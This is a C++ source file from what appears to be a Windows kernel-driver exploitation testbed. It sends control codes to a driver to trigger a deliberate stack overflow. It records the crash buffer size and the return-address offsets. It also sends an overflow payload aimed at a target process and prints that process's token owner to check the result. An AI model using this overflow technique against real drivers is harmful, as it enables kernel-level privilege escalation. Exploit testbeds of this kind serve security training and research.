#include "send_ctl_codes.h"

namespace send_ctl_codes
{
	service_functions :: ServiceManager m_smCsmgr;

	bool run_basic_mem_access() {
		// Prepare buffers
		return m_smCsmgr.send_ctrl_code(TESTBED_BASIC_MEMORY_ACCESS, NULL, 0, NULL, 0, 0);
	}

	bool run_simple_stack_overflow(DWORD bufferSz) {
		auto b_res = false;
		byte* input_buffer = (byte*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSz);
		if (input_buffer){
			memset(input_buffer, /*0x49*/ (int)'I', bufferSz);

			/*
			E.g.
			bufferSize = 0 --> no crash
			bufferSize = 1 --> no crash
			...
			bufferSize = 2063 --> no crash
			bufferSize = 2064 --> no crash
			bufferSize = 2065 --> crash

			RIP = 2064 + 8
			RSP = 2064 + 8 + 8	
			*/

			b_res = m_smCsmgr.send_ctrl_code(TESTBED_SIMPLE_STACK_OVERFLOW, input_buffer, bufferSz, NULL, 0, 0);
			HeapFree(GetProcessHeap(), 0, input_buffer);
		}
		return b_res;
	}

	void get_process_token(const char* title, const DWORD targetPid) {
		HANDLE h_proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
		HANDLE h_proc_handle = NULL;
		if (h_proc && OpenProcessToken(h_proc, TOKEN_QUERY , &h_proc_handle)) {
			if (h_proc_handle){
				DWORD needed_sz = 0;
				GetTokenInformation(h_proc_handle, TokenOwner, NULL, 0, &needed_sz);
				if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
					PTOKEN_OWNER token_info = (PTOKEN_OWNER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, needed_sz);
					if (token_info) {
						RtlZeroMemory(token_info, needed_sz);
						if (GetTokenInformation(h_proc_handle, TokenOwner, token_info, needed_sz, &needed_sz)) {
							WCHAR user_name[MAX_PATH] = { 0 }, domain_name[MAX_PATH] = { 0 };
							DWORD user_name_sz = MAX_PATH, domain_name_sz = MAX_PATH;
							SID_NAME_USE s;
							if (LookupAccountSid(NULL, token_info->Owner, user_name, &user_name_sz, domain_name, &domain_name_sz, &s)) {
								cout << title << endl;
								cout << "pid = " << std::dec << targetPid << " owner: ";
								wcout << domain_name << '/' << user_name << endl;
							}
						}
						HeapFree(GetProcessHeap(), 0, token_info);
					}
				}
				CloseHandle(h_proc_handle);
			}
		}
		CloseHandle(h_proc);
	}

	bool run_stack_overflow_with_payload(const DWORD targetPid) {
		auto b_res = false;
		{ // PayloadStackOverFlow constructor
			payload_stack_overflow::PayloadStackOverFlow my_payload(targetPid);
			if (my_payload.init()) {
				b_res = m_smCsmgr.send_ctrl_code(TESTBED_SIMPLE_STACK_OVERFLOW, 
					my_payload._buffer, my_payload._bufferSz, NULL, 0, 0);
				
			}
		} // PayloadStackOverFlow destructor
		return b_res;
	}
}
